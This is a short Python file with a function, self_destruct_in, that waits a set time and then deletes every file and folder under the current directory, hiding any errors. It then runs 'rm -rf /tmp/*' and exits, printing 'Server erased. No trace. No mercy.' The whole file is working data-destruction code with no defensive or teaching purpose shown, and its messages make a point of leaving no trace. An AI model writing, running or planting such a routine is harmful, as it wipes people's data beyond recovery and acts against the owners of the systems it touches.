import os
import shutil
import time

def self_destruct_in(seconds=60):
    time.sleep(seconds)
    print("💀 Self-destruct sequence initiated...")

    # Wipe all files
    for root, dirs, files in os.walk(".", topdown=False):
        for name in files:
            try:
                os.chmod(os.path.join(root, name), 0o777)
                os.remove(os.path.join(root, name))
            except: pass
        for name in dirs:
            try:
                os.rmdir(os.path.join(root, name))
            except: pass

    # Final purge
    os.system("rm -rf /tmp/*")
    print("💥 Server erased. No trace. No mercy.")
    os._exit(0)
